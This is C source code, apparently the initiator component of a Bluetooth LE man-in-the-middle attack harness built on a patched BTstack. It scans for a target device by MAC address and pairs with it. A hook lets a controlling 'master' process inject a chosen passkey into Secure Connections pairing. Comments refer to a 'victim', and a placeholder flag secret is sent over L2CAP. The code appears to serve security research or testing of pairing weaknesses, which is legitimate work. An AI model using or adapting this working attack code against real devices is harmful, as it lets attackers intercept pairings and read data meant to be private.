#define __BTSTACK_FILE__ "main.c"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/wait.h>


// #include "PatchedMBTstack/src/btstack_debug.h"
// #include "PatchedMBTstack/src/btstack_event.h"
// // #include "btstack_link_key_db_fs.h"
// #include "PatchedMBTstack/src/btstack_memory.h"
// #include "PatchedMBTstack/src/btstack_run_loop.h"
// #include "PatchedMBTstack/platform/posix/btstack_run_loop_posix.h"
// #include "PatchedMBTstack/platform/embedded/hal_led.h"
// #include "PatchedMBTstack/src/hci.h"
// #include "PatchedMBTstack/src/hci_dump.h"
// #include "PatchedMBTstack/src/btstack_stdin.h"
// // #include "btstack_audio.h"
// #include "PatchedMBTstack/platform/posix/btstack_tlv_posix.h"
// #include "PatchedMBTstack/src/bluetooth_data_types.h"
// #include "PatchedMBTstack/src/bluetooth_company_id.h"
// #include "PatchedMBTstack/chipset/zephyr/btstack_chipset_zephyr.h"
// #include "PatchedMBTstack/src/ble/le_device_db.h"
// #include "PatchedMBTstack/src/ble/att_server.h"

#include "btstack_debug.h"
#include "btstack_event.h"
// #include "btstack_link_key_db_fs.h"
#include "btstack_memory.h"
#include "btstack_run_loop.h"
#include "btstack_run_loop_posix.h"
#include "hal_led.h"
#include "hci.h"
#include "hci_dump.h"
#include "hci_dump_posix_fs.h"
#include "btstack_stdin.h"
// #include "btstack_audio.h"
#include "btstack_tlv_posix.h"
#include "bluetooth_data_types.h"
#include "bluetooth_company_id.h"
#include "btstack_chipset_zephyr.h"
#include "le_device_db.h"
#include "att_server.h"
#include <libusb.h>
#include <unistd.h>
#include "le_device_db.h"

#include "../profiles.h"
#include "../btstack_config.h"

#define USB_MAX_PATH_LEN 7
#define FIXED_PASSKEY 123456
#define REMOTE_SERVICE 0x1111


/* Helper structs */
hci_con_handle_t connection_handle;
uint16_t connection_id;
bool second_stage = false;

/* FDs for IPC */
int initiator_to_master;
int initiator_from_master;

/* Globals */
bd_addr_t target_mac;
static uint8_t data_channel_buffer[TEST_PACKET_SIZE];
const char secret[] = "flag{INITIATOR_SECRET}";
bd_addr_t target_address;
uint8_t target_address_type;
hci_con_handle_t con_handle;

static btstack_packet_callback_registration_t hci_event_callback_registration;
static btstack_packet_callback_registration_t sm_event_callback_registration;

/* Predefines */
int btstack_main(int argc, const char * argv[]);

const uint8_t adv_data[] = {
	// Flags general discoverable, BR/EDR not supported
	0x02, BLUETOOTH_DATA_TYPE_FLAGS, 0x06,
	// Name
	0x0b, BLUETOOTH_DATA_TYPE_COMPLETE_LOCAL_NAME, 'C', 'A', 'R', 'D', 'R', 'E', 'A', 'D', 'E', 'R',
	// Incomplete List of 16-bit Service Class UUIDs -- 1111 - only valid for testing!
	0x03, BLUETOOTH_DATA_TYPE_INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS, 0x11, 0x11,
};
const uint8_t adv_data_len = sizeof(adv_data);

static void ipc_read(int fd, char *buf, size_t size)
{
	if((size_t)read(fd, buf, size) != size)
	{
		printf("INIT: IPC read error\n");
		raise(SIGINT);
	}
}

static void le_device_delete_all(void){
	uint16_t index;
	uint16_t max_count = le_device_db_max_count();
	for (index =0 ; index < max_count; index++){
		int addr_type;
		bd_addr_t addr;
		memset(addr, 0, 6);
		le_device_db_info(index, &addr_type, addr, NULL);
		if (addr_type != BD_ADDR_TYPE_UNKNOWN){
			log_info("Remove LE Device with index %u, addr type %x, addr %s", index, addr_type, bd_addr_to_str(addr));
			le_device_db_remove(index);
		}
	}
	le_device_db_dump();
}

static void ipc_write(int fd, char *buf, size_t size)
{
	if((size_t)write(fd, buf, size) != size)
	{
		printf("INIT: IPC write error\n");
		raise(SIGINT);
	}
}

static void l2cap_client_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);

	bd_addr_t event_address;
	uint16_t psm;
	uint16_t temp_connection_id;
	hci_con_handle_t handle;

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet))
			{
				case L2CAP_EVENT_CBM_CHANNEL_OPENED:
					l2cap_event_cbm_channel_opened_get_address(packet, event_address);
					psm = l2cap_event_cbm_channel_opened_get_psm(packet);
					temp_connection_id = l2cap_event_cbm_channel_opened_get_local_cid(packet);
					handle = l2cap_event_cbm_channel_opened_get_handle(packet);
					if (packet[2] == 0)
					{
						printf("INIT: L2CAP: LE Data Channel successfully opened: %s, handle 0x%02x, psm 0x%02x, local connection_id 0x%02x, remote connection_id 0x%02x\n", bd_addr_to_str(event_address), handle, psm, temp_connection_id,  little_endian_read_16(packet, 15));
						connection_id = temp_connection_id;
						connection_handle = handle;
						l2cap_request_can_send_now_event(connection_id);
					}
					else
					{
						printf("INIT: L2CAP: LE Data Channel connection to device %s failed. status code %u\n", bd_addr_to_str(event_address), packet[2]);
					}
					break;

				case L2CAP_EVENT_CAN_SEND_NOW:
					// printf("INIT: L2CAP Can send now\n");
					l2cap_send(connection_id, (uint8_t *)secret, strlen(secret) + 1);

					/* Request another packet */
					sleep(1);
					l2cap_request_can_send_now_event(connection_id);
					break;

				case L2CAP_EVENT_CHANNEL_CLOSED:
					printf("INIT: L2Cap connection closed\n");
					break;

			}
			break;

		case L2CAP_DATA_PACKET:
			printf("INIT: Received secret: %s\n", packet);
			break;
	}
}

static void initiator_sm_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	char buf[10];
	uint32_t passkey;

	if(packet_type != HCI_EVENT_PACKET)
		return;

	switch(hci_event_packet_get_type(packet))
	{
		case SM_EVENT_JUST_WORKS_REQUEST:
			printf("INIT: Just works requested\n");
			sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
			break;
		case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
			printf("\n\nINIT: Confirming numeric comparison: \e[31m%06d\e[0m\n\n\n", sm_event_numeric_comparison_request_get_passkey(packet));
			sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
			break;
		case SM_EVENT_PASSKEY_DISPLAY_NUMBER:
			printf("INIT: Display Passkey: %06d\n", sm_event_passkey_display_number_get_passkey(packet));
			break;
		case SM_EVENT_PASSKEY_INPUT_NUMBER:
			printf("INIT: Passkey Input requested\n Please Enter>\n");
			fgets(buf, 10, stdin);
			passkey = (uint32_t) atoi(buf);
			printf("INIT: Sending passkey %06d\n", passkey);
			sm_passkey_input(sm_event_passkey_input_number_get_handle(packet), passkey);
			break;
		case SM_EVENT_PAIRING_COMPLETE:
			switch (sm_event_pairing_complete_get_status(packet))
			{
				case ERROR_CODE_SUCCESS:
					printf("INIT: Pairing complete, success\n");

					if(!second_stage)
					{
						/* Confirm success of PE pairing to master (and thus continue to next stage or finish) */
						ipc_write(initiator_to_master, buf, 1);
						second_stage = true; /* Remember that we are now in second stage */
						/* Issue a new connection request */
						le_device_delete_all();
						sm_request_pairing(con_handle);
					}
					else
					{
						/* Confirm success of second stage comparison to master */
						ipc_write(initiator_to_master, buf, 1);
						printf("INIT: Establishing L2CAP channel\n");
						l2cap_le_create_channel(&l2cap_client_packet_handler, connection_handle, TSPX_le_psm, data_channel_buffer, sizeof(data_channel_buffer), L2CAP_LE_AUTOMATIC_CREDITS, LEVEL_2, &connection_id);
					}
					break;
				case ERROR_CODE_CONNECTION_TIMEOUT:
					printf("INIT: Pairing failed, timeout\n");
					break;
				case ERROR_CODE_REMOTE_USER_TERMINATED_CONNECTION:
					printf("INIT: Pairing failed, disconnected\n");
					break;
				case ERROR_CODE_AUTHENTICATION_FAILURE:
					printf("INIT: Pairing failed, reason = %u\n", sm_event_pairing_complete_get_reason(packet));
					break;
				default:
					break;
			}
			break;
		default:
			break;
	}
}

struct list{
	struct list* next;
	uint8_t address[6];
};
struct list* advertisements;

static int new_advertisement(uint8_t* new_add)
{
	//printf("inc add %s\n", bd_addr_to_str(new_add));
	if (!advertisements)
	{
		//printf("first adv\n");
		advertisements = calloc(1, sizeof(struct list));
		memcpy(advertisements->address, new_add, 6);
		return 1;
	}

	struct list* ptr = advertisements;
	while(ptr)
	{
		if (memcmp(ptr->address, new_add, 6) == 0)
			return 0;
		ptr = ptr->next;
	}

	//printf("new adv\n");

	ptr = advertisements;
	while(ptr->next)
		ptr = ptr->next;
	ptr->next = calloc(1, sizeof(struct list));
	memcpy(ptr->next->address, new_add, 6);
	//printf("added\n");
	return 1;
}

static void print_advertisements(void)
{
	printf("AVAILABLE ADDRESSES:\n");
	struct list* ptr = advertisements;
	while(ptr)
	{
		printf("%s\n", bd_addr_to_str(ptr->address));
		ptr = ptr->next;
	}
	printf("--------------------\n");
}

static void initiator_hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);

	if (packet_type != HCI_EVENT_PACKET) return;

	switch (hci_event_packet_get_type(packet)) {
		case BTSTACK_EVENT_STATE:
			// BTstack activated, get started
			if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
			{
				printf("INIT: Start scanning!\n");
				gap_set_scan_parameters(1, 0x0030, 0x0030);
				gap_start_scan();
			}
			break;
		case GAP_EVENT_ADVERTISING_REPORT:
			gap_event_advertising_report_get_address(packet, target_address);
			target_address_type = gap_event_advertising_report_get_address_type(packet);
			//uint8_t length = gap_event_advertising_report_get_data_length(packet);
			//const uint8_t * data = gap_event_advertising_report_get_data(packet);
			//printf("adv\n");
			if (new_advertisement((uint8_t*) target_address) == 1)
				print_advertisements();
			//printf("Advertisement event: addr-type %u, addr %s, data[%u] ", target_address_type, bd_addr_to_str(target_address), length);
			//printf_hexdump(data, length);
			//if(!ad_data_contains_uuid16(length, (uint8_t *) data, REMOTE_SERVICE))
			//	break;
			if(memcmp(target_address, target_mac, sizeof(bd_addr_t)) == 0)
			{
				printf("INIT: Found targeted remote (%s) with UUID %04x, connecting...\n", bd_addr_to_str(target_address), REMOTE_SERVICE);
				gap_stop_scan();
				gap_connect(target_address, target_address_type);
			}
			break;
		case HCI_EVENT_LE_META:
			// wait for connection complete
			if (hci_event_le_meta_get_subevent_code(packet) != HCI_SUBEVENT_LE_CONNECTION_COMPLETE)
				break;
			con_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
			printf("INIT: Connection complete\n");
			connection_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
			// start pairing
			sm_request_pairing(con_handle);
			break;
		case HCI_EVENT_ENCRYPTION_CHANGE:
			con_handle = hci_event_encryption_change_get_connection_handle(packet);
			printf("INIT: Connection encrypted: %u\n", hci_event_encryption_change_get_encryption_enabled(packet));
			break;
		default:
			break;
	}
}

static void sigint_handler(int param)
{
	UNUSED(param);

	printf("INIT: CTRL-C - SIGINT received, shutting down..\n");
	log_info("INIT: sigint_handler: shutting down");

	btstack_stdin_reset();

	hci_power_control(HCI_POWER_OFF);
	hci_close();

	log_info("INIT: Good bye, see you.\n");
	exit(0);
}

static void initiator_set_custom_passkey(uint32_t* tk)
{
	printf("INIT: old tk %d\n", *tk);

	/* Waiting for Va */
	ipc_read(initiator_from_master, (char*)tk, sizeof(uint32_t));

	printf("INIT: new passkey %d\n", *tk);

	if (*tk < 100000)
	{
		printf("INIT: WARNING passkey has leading 0, abort\n");
		// raise(SIGINT);
	}
	printf("INIT: new tk %d\n", *tk);
}


static void register_mitm_options(void)
{
	struct SmMitmOptions* mitm_options = calloc(1, sizeof(struct SmMitmOptions));
	mitm_options->initiator_set_custom_passkey_callback = &initiator_set_custom_passkey;
	sm_register_mitm_options(mitm_options);
}

int main(int argc, const char * argv[])
{
	char pklg_path[100];
	uint8_t initiator_usb_device_id;
	uint8_t initiator_usb_device_bus;
	char buf[100];

	/* Parse arguments */
	if(argc < 5)
	{
		printf("Too few arguments provided\n");
		printf("Usage:./%s initiator_usb_bus:initiator_device_id target_mac[aa:bb:cc:dd:ee:ff]\n", argv[0]);
		exit(0);
	}

	sscanf(argv[1], "%hhd:%hhd", (char *)&initiator_usb_device_bus, (char *)&initiator_usb_device_id);
	printf("INIT: Using USB bus %d with address %d\n", initiator_usb_device_bus, initiator_usb_device_id);

	if(sscanf_bd_addr(argv[2], target_mac) == 0)
	{
		printf("MAC provided appears invalid\n");
		exit(0);
	}

	initiator_to_master = strtol(argv[3], 0, 10);
	initiator_from_master = strtol(argv[4], 0, 10);

	printf("INIT: FD initiator_to_master: %d\n", initiator_to_master);
	printf("INIT: FD initiator_from_master: %d\n", initiator_from_master);

	signal(SIGINT, sigint_handler);

	btstack_memory_init();
	btstack_run_loop_init(btstack_run_loop_posix_get_instance());

	hci_transport_usb_set_address(initiator_usb_device_bus, initiator_usb_device_id);

	/* Logger */
	strcpy(pklg_path, "/tmp/hci_dump_test_mitm_initiator");
	strcat(pklg_path, ".pklg");
	printf("Packet Log: %s\n", pklg_path);
	hci_dump_posix_fs_open(pklg_path, HCI_DUMP_PACKETLOGGER);

	hci_init(hci_transport_usb_instance(), NULL);

	l2cap_init();
	le_device_db_init();
	register_mitm_options();
	sm_init();

	/* setup ATT server */
	att_server_init(initiator_profile_data, NULL, NULL);

	/**
	 * Bonding is disabled to allow for repeated testing. It can be enabled with SM_AUTHREQ_BONDING
	 */

	// register handler
	hci_event_callback_registration.callback = &initiator_hci_packet_handler;
	hci_add_event_handler(&hci_event_callback_registration);

	sm_event_callback_registration.callback = &initiator_sm_packet_handler;
	sm_add_event_handler(&sm_event_callback_registration);

	/* LE Secure Connections, Passkey Entry */
	// sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
	// sm_set_authentication_requirements(IO_CAPABILITY_NO_INPUT_NO_OUTPUT);
	// sm_set_io_capabilities(IO_CAPABILITY_KEYBOARD_DISPLAY);
	// sm_set_io_capabilities(IO_CAPABILITY_KEYBOARD_ONLY);
	sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
	// sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
	// sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION);
	sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);

	hci_power_control(HCI_POWER_ON);
	printf("INIT: Initialized\n");

	/* Waiting for master to tell us victim has approached it */
	printf("INIT: Waiting\n");
	ipc_read(initiator_from_master, buf, 1);
	printf("INIT: Continuing\n");

	btstack_run_loop_execute();

	return 0;
}
